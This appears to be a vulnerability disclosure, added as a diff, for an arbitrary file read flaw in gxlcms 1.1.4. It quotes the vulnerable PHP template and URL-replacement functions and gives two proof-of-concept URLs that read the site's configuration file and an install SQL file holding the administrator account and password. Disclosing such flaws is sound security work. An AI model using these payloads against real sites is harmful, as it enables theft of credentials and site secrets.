@@ -1,0 +1,36 @@
+There is an arbitrary file read vulnerability on gxlcms1.1.4
+
+Description:
+There is an arbitrary file read vulnerability on /WWW/gxlcms/Lib/Common/Admin/function.php
+It allows an attacker to read arbitrary files
+
+Vulnerability page
+1. /www/Lib/Lib/Action/Admin/TplAction.class.php:
+...
+public function add(){
+		$filename = admin_ff_url_repalce(str_replace('*','.',trim($_GET['id'])));  //Focus on the admin_ff_url_repalce function.
+		if (empty($filename)) {
+			$this->error('模板名称不能为空！');
+		}
+		$content = read_file($filename);
+		$this->assign('filename',$filename);
+		$this->assign('content',htmlspecialchars($content));
+		$this->display('./Public/system/tpl_add.html');
+	}
+...
+
+2. /WWW/gxlcms/Lib/Common/Admin/function.php
+....
+function admin_ff_url_repalce($xmlurl,$order='asc'){
+	if($order=='asc'){
+		return str_replace(array('|','@','#','||'),array('/','=','&','//'),$xmlurl);
+	}else{
+		return str_replace(array('/','=','&','||'),array('|','@','#','//'),$xmlurl);
+	}	
+}
+...
+
+POC：
+http://127.0.0.1/index.php?s=Admin-Tpl-ADD-id-.|Runtime|Conf||config*php   //Read the configuration file of the website
+
+http://127.0.0.1/index.php?s=Admin-Tpl-ADD-id-.|Runtime|Install||install*sql //Read the administrator's password and account
